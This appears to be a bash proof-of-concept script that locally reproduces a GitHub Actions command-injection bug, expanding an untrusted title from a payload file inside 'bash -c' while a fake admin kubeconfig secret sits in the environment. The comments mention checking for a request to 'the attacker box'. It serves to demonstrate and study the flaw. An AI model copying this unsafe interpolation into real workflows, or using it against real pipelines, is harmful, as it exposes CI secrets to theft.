#!/usr/bin/env bash
# Same bug, no GitHub needed -- runs the EXACT shell the vulnerable workflow
# would run, with a fake secret, so you can see the breakout before wiring up
# the real pipeline. This is the real vulnerable code, not a mock-up.
set -uo pipefail
TITLE="$(head -1 "$(dirname "$0")/payload.txt")"
export KUBECONFIG_ADMIN="FAKE-ADMIN-KUBECONFIG-abc123"   # pretend secret
echo "The workflow step expands to this script:"; echo "----"
printf 'echo "Running command: %s"\n' "$TITLE"
echo "----"; echo "Running it:"
# This is byte-for-byte what GitHub Actions would execute on the runner:
bash -c "echo \"Running command: ${TITLE}\""
echo "If a request hit the attacker box above, the injection worked."
